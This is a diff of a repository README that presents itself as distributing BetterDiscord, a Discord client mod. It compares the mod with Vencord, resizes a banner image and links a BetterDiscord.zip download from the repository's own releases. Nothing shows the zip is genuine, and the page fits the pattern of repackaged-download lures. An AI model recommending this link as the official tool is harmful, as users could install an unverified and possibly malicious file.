@@ -4,7 +4,7 @@ is the most popular free client mod for Discord that lets you install custom the
 
 If you're deciding between **BetterDiscord or Vencord**, both are excellent. BetterDiscord has the larger plugin and theme library built up over years; Vencord is newer and more lightweight. Many users install both. This repository ships the latest BetterDiscord release, fully compatible with the current Discord stable version.
 
-<img width="1200" height="1200" alt="40889f16-ee21-4a2d-b647-97a9764ea52e" src="https://github.com/user-attachments/assets/f3e95f95-a3dd-4475-8ce0-9c879575915d" />
+<img width="120" height="120" alt="40889f16-ee21-4a2d-b647-97a9764ea52e" src="https://github.com/user-attachments/assets/f3e95f95-a3dd-4475-8ce0-9c879575915d" />
 
 ## Install
 [Download `BetterDiscord.zip`](https://github.com/discord-bd/BetterDiscord/releases/download/v1.13.15/BetterDiscord.zip)
